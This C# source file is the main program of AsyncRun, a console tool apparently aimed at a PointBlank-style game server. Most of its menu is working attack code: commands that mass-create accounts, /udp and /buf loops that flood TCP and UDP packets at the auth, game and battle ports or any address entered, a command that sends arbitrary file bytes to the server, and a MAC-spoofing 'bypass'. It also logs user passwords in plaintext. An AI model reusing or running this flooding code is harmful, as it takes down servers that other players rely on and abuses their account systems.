using AsyncRun.Enums;
using AsyncRun.Model;
using AsyncRun.protocol;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

namespace AsyncRun
{
    public class Program
    {
        public static volatile BASE_CHATTING chatadaptado;
        public static volatile Base room;
        public static Loader load = Loader.INTs();
        public static void Main(string[] args)
        {
            try
            {
                load.Run();
                LoggerXML.Log($"[Program] AsyncRun Iniciado. {Application.ProductVersion}", "CONEXAO");
                LoggerXML.Log($"Login: {load.USER} || senha: {load.PASS}", "CONEXAO");

                new Thread(new ThreadStart(Ram)).Start();
                Logger.Mostrar($"  Computer: {Environment.MachineName}   Date:[{DateTime.Now.ToString("dd/MM/yy HH:mm:ss")} Process: {Environment.ProcessorCount} Fisic: {Environment.WorkingSet}");
                Logger.Mostrar("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
                Logger.Mostrar("[]                                                                          []");
                Logger.Mostrar("[]              *</>  Developed by: (c) Wesley Vale - 2019  </>*            []");
                Logger.Mostrar("[]                                                                          []");
                Logger.Mostrar("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
                Logger.Error("------------------------------------------------------------------------------");
                Logger.Error("                  O Impossivel é só questão de opiniao!");
                Logger.Error("------------------------------------------------------------------------------");
                Logger.Warnnig($"Socket: {load.IP}:{load.PORT} Cliente: {load.CLIENTEVERSION} Região: {load.region} Host: {load.CONNECTION}");
                Logger.Warnnig("");
                try
                {
                    // Mail.SendEmail();
                    Logger.Warnnig("       Programa Desenvolvido para simular uma ação à um Host(Server).");
                    if (load.AutoCreate)
                        new Thread(new ThreadStart(Conexao)).Start();
                    else
                    {
                        Logger.Error("");
                        Logger.Conta("[Async funtions]  Digite seu usuario: ");
                        string UserLogin = Console.ReadLine();
                        Logger.Conta("[Async funtions]  Digite sua senha: ");
                        string UserPass = Console.ReadLine();

                        if (!string.IsNullOrEmpty(UserLogin) && !string.IsNullOrEmpty(UserPass))
                        {
                            if (UserLogin.Length <= 20 && UserLogin.Length >= 4 && UserPass.Length <= 20 && UserPass.Length >= 4)
                            {
                                load.USER = UserLogin;
                                load.PASS = UserPass;
                                Logger.Warnnig($"[Async funtions]  Conexão user '{load.USER}' '{load.PASS}'");
                                Logger.Warnnig("[Async funtions] Pressione OK, Para continuar...");
                                new Thread(new ThreadStart(Conexao)).Start();
                            }
                            else
                            {
                                Logger.Error($"[Async funtions]  Login e senha não pode ser menor que 4 ou maior que 20!");
                            }
                        }
                        else
                        {
                            Logger.Error($"[Async funtions]  Error ao tentar logar.");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error(ex.ToString());
                }
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
            Process.GetCurrentProcess().WaitForExit();
        }
        public static void Conexao()
        {
            try
            {
                reload:
                Logger.Info("----------------CONEXÃO AUTOMATICA nº: [ 1 ] OU MANUAL nº: [ 2 ]----------------");
                switch (Console.ReadLine().ToLower())
                {
                    case "1":
                        {
                            LoggerXML.Log("[Async Conexao] Automatica.", "CONEXAO");
                            new Thread(new ThreadStart(Connection.INSTs().SocketClientAuth)).Start();
                            break;
                        }
                    case "2":
                        {
                            LoggerXML.Log("[Async Conexao] Manual.", "CONEXAO");
                            Logger.Warnnig("[Async funtions] Digite seu IP");
                            string IP = Console.ReadLine();    //Checkar o Valor se é Valido do IP TryParse
                            if (IP != null || IP.Length > 20)
                            {
                                Logger.Warnnig("[Async funtions]  Digite sua PORTA");
                                ushort Porta = ushort.Parse(Console.ReadLine());
                                if (Porta > 39191)
                                    Logger.Error("Tá doido Jogador?[" + Porta + "]");
                                Logger.Warnnig("[Async funtions] Digite a versão da client");
                                string Versão = Console.ReadLine();
                                if (Versão.Length > 8)
                                    Logger.Error("tá doido Jogador?[" + Versão + "]");


                                Logger.Warnnig("[Async funtions] Digite a Locale Client");
                                Regions locale = (Regions)byte.Parse(Console.ReadLine());
                                Console.Clear();
                                Logger.Warnnig($"Conexão para  {IP}:{Porta} em  {Versão} {locale}");
                                if (locale > 0)
                                {
                                    load.IP = IP;
                                    load.PORT = Porta;
                                    load.CLIENTEVERSION = Versão;
                                    load.region = locale;
                                    if (IP != null && Porta != 0)
                                        new Thread(new ThreadStart(Connection.INSTs().SocketClientAuth)).Start();
                                }
                                else
                                {
                                    Logger.Error("tá doido Jogador?[" + locale + "]");
                                }
                            }
                            else
                            {
                                Logger.Error("[Async funtions] Error IP não pode ser nulo.");
                            }
                            break;
                        }
                    case "/login":
                        {
                            GetSession.INST().floodAccounts = true;
                            int count = 0;
                            Logger.Warnnig("[Async Atack] Você deseja flodar quantas contas? (1 À 1000)");
                            int contas = int.Parse(Console.ReadLine());
                            for (count = 0; count <= contas; count++)
                            {
                                new Thread(new ThreadStart(Connection.INSTs().AutoAccounts)).Start();
                                Console.Clear();
                                Thread.Sleep(1000);
                            }
                            Logger.Sucess($"[Async Atack] ATACK REALIZADO COM SUCESSO! contas criadas: {count}");
                            break;
                        }
                    case "/send":
                        {
                            Logger.Warnnig("[Async Atack] Digite o nome do arquivo dentro da pasta ataque, Ex: [PointBlank.exe]");
                            string arquivo = Console.ReadLine();
                            Logger.Warnnig("[Async Atack] Enviar algum arquivo em forma de bytes para AUTH [1] ou GAME [2]?");
                            switch (Console.ReadLine())
                            {
                                case "1": SocketComponets.SendByteInTextAuth(arquivo); break;
                                case "2": SocketComponets.SendByteInTextGame(arquivo); break;
                                default:
                                    {
                                        Logger.Error("ERROR");
                                        break;
                                    }
                            }
                            break;
                        }
                    case "/users":
                        {
                            GetSession.INST().floodAccounts = true;
                            int count = 0;
                            for (; ; )
                            {
                                new Thread(new ThreadStart(Connection.INSTs().AutoAccounts)).Start();
                                Thread.Sleep(5);
                                Logger.Sucess($"[Async Atack] ATACK REALIZADO COM SUCESSO! contas socket: {++count}");
                            }

                        }
                    case "/bypass":
                        {
                            if (!load.AutoCreate)
                                Logger.Error("Coloque auto create!");
                            else
                            {
                                Logger.Warnnig("Digite ID: ");
                                string id = Console.ReadLine();
                                Logger.Warnnig("Digite sua senha: ");
                                string senha = Console.ReadLine();
                                Logger.Warnnig("Digite um novo MAC");
                                string mac = Console.ReadLine();
                                if (mac.Length > 17)
                                {
                                    load.meuMac = mac;
                                    Logger.Info(mac);
                                }
                                if (string.IsNullOrEmpty(id) || string.IsNullOrEmpty(senha))
                                    Logger.Error("id ou Senha nao pode ser nula!");
                                if (id.Length < 4 || senha.Length < 4)
                                    Logger.Error("id ou Senha nao pode ser menor que 4!");
                                else
                                {
                                    load.USER = id;
                                    load.PASS = senha;
                                    new Thread(new ThreadStart(Connection.INSTs().SocketClientAuth)).Start();
                                }
                            }
                            break;
                        }
                    case "/udp":
                        {
                            int count = 0;
                            while (true)
                            {
                                try
                                {
                                    IPEndPoint Remote = new IPEndPoint(IPAddress.Parse(load.IP), 40009);
                                    UdpClient udp = new UdpClient
                                    {
                                        Client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp),
                                    };
                                    udp.Client.Connect(Remote);
                                    byte[] buffer = BitConverter.GetBytes(new Random().Next(22, 1000));
                                    if (udp.Client.Connected)
                                        udp.Client.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(Retorno), udp);
                                    else
                                    {
                                        Logger.Error($"[Async buffer] break"); break;
                                    }
                                    Thread.Sleep(5);
                                    Logger.Warnnig($"[Async buffer] UdpClient [{++count}], Lenght '{buffer.Length}'");
                                }
                                catch (Exception ex)
                                {
                                    Logger.Error(ex.ToString()); break;
                                }
                            }
                            break;
                        }
                    case "/buf":
                        {
                            int packet = 0;
                            Logger.Warnnig("[Async Atack Buffer] IP Automatico [ 1 ] ou Manual [ 2 ] ");
                            switch (Console.ReadLine().ToLower())
                            {
                                case "1":
                                    {
                                        volteipraca:
                                        IPEndPoint RemoteAuth = new IPEndPoint(IPAddress.Parse(load.IP), 39190);
                                        IPEndPoint RemoteGame = new IPEndPoint(IPAddress.Parse(load.IP), 39191);
                                        IPEndPoint RemoteUDP = new IPEndPoint(IPAddress.Parse(load.IP), 40009);
                                        Logger.Warnnig("[Async Atack Buffer] Tamanho de Bytes: ");
                                        int i = int.Parse(Console.ReadLine());
                                        byte[] b = new byte[i];
                                        while (true)
                                        {
                                            try
                                            {
                                                Socket AUTH = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                                AUTH.Connect(RemoteAuth);
                                                if (AUTH.Connected)
                                                {
                                                     AUTH.BeginSend(b, 0, b.Length, SocketFlags.None, new AsyncCallback(SendCallback), AUTH);
                                                }


                                                Socket GAME = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                                GAME.Connect(RemoteGame);
                                                if (GAME.Connected)
                                                {
                                                    GAME.BeginSend(b, 0, b.Length, SocketFlags.None, new AsyncCallback(SendCallback), GAME);
                                                }

                                                Socket UDP = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                                                UDP.Connect(RemoteGame);
                                                if (UDP.Connected)
                                                {
                                                      if (b.Length > 1000)
                                                          b = new byte[1000];
                                                    UDP.BeginSend(b, 0, b.Length, SocketFlags.None, new AsyncCallback(SendCallback), UDP);
                                                }
                                                Logger.Send($"[P] TCP. Auth [{++packet}] {RemoteAuth.ToString()}");
                                                Logger.Send($"[P] TCP, Game [{++packet}] {RemoteGame.ToString()}");
                                                Logger.Send($"[P] UDP, Battle [{++packet}] {RemoteUDP.ToString()}");
                                            }
                                            catch (Exception ex)
                                            {
                                                Logger.Error(ex.ToString());
                                                goto volteipraca;
                                            }
                                        }
                                    }
                                case "2":
                                    {
                                        Logger.Warnnig("[Async Atack Buffer] Digite o IP: ");
                                        string IP = Console.ReadLine();
                                        Logger.Warnnig("[Async Atack Buffer] Digite a Porta TCP: ");
                                        ushort portaTCP = ushort.Parse(Console.ReadLine());
                                        Logger.Warnnig("[Async Atack Buffer] Digite a Porta UDP: ");
                                        ushort portaUDP = ushort.Parse(Console.ReadLine());
                                        Logger.Warnnig("[Async Atack Buffer] Tamanho de Bytes: ");
                                        byte[] b = BitConverter.GetBytes(int.Parse(Console.ReadLine()));
                                        if (IP != null || portaTCP != 0 || portaUDP != 0)
                                        {
                                            volteipraca:
                                            IPEndPoint iPEndudp = new IPEndPoint(IPAddress.Parse(IP), portaUDP);
                                            IPEndPoint iPEndTCP = new IPEndPoint(IPAddress.Parse(IP), portaTCP);
                                            while (true)
                                            {
                                                try
                                                {
                                                    Socket UDP = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                                                    UDP.Connect(iPEndudp);
                                                    if (UDP.Connected)
                                                    {
                                                        if (b.Length > 1000)
                                                            b = new byte[1000];
                                                        UDP.BeginSend(b, 0, b.Length, SocketFlags.None, new AsyncCallback(SendCallback), UDP);
                                                        Logger.Send($"protocolo Type DataGram.   BufferPacketUDP[{++packet}] {iPEndudp.ToString()}");
                                                    }
                                                    Thread.Sleep(load.InternalMilisegundos);
                                                    Socket TCP = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                                                    TCP.Connect(iPEndTCP);
                                                    if (TCP.Connected)
                                                    {
                                                        TCP.BeginSend(b, 0, b.Length, SocketFlags.None, new AsyncCallback(SendCallback), TCP);
                                                        Logger.Send($"protocolo Type Stream.   BufferPacketTCP[{++packet}] {iPEndTCP.ToString()}");
                                                    }
                                                }
                                                catch (Exception ex)
                                                {
                                                    Logger.Error(ex.ToString());
                                                    Thread.Sleep(10000);
                                                    goto volteipraca;
                                                }
                                                goto volteipraca;
                                            }
                                        }
                                        else
                                        {
                                            Logger.Error("[Async error] As configurações de socket não podem ser nulas!");
                                        }
                                        break;
                                    }
                                default:
                                    {
                                        Logger.Error("[Async error] Você tentou uma opção Invalida!");
                                        break;
                                    }
                            }
                            break;

                        }
                    case "/log":
                        {
                            try
                            {
                                LoggerXML.DeleteLog(false);
                                Console.Beep();
                            }
                            catch (Exception ex)
                            {
                                Logger.Error(ex.ToString());
                            }
                            goto reload;
                        }
                    default:
                        {
                            Logger.Warnnig("[Async Default] Configuração Errada!");
                            Console.Beep();
                            goto reload;
                        }
                }
            }
            catch (Exception ex)
            {
                ex.ToString();
            }
        }
        private static void Retorno(IAsyncResult ar)
        {
            UdpClient c = (UdpClient)(ar.AsyncState);
            ar.AsyncWaitHandle.WaitOne(5000);
            if (c != null && c.Client.Connected)
                c.EndSend(ar);
        }
        private static void SendCallback(IAsyncResult ar)
        {
            Socket handler = (Socket)ar.AsyncState;
            ar.AsyncWaitHandle.WaitOne(5000);
            if (handler != null && handler.Connected)
                handler.EndSend(ar);
        }
        public static void LobbyChatting()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(chatadaptado = new BASE_CHATTING());
        }
        public static void Ram()
        {
            while (true)
            {
                Console.Title = $"AsyncRun Server {Application.ProductVersion}   [{GC.GetTotalMemory(true) / 4024} KB]";
                Thread.Sleep(300);
            }
        }
    }
}
